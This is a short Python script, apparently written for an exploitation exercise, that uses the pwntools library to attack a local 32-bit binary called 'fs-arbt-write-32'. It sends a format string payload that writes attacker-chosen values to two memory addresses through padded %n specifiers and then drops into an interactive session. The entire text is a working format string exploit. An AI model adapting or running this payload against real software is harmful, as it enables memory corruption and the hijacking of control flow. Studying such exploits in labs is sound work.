#!/usr/bin/env python

from pwn import *

p = process('./fs-arbt-write-32')
p.recv()
buf = p32(0x804a048)
buf += p32(0x804a04a)
buf += '%45060x'
buf += '%7$n'
buf += '%19138x'
buf += '%8$n'
print(buf)
p.sendline(buf)
print(p.read())
p.interactive()
p.close()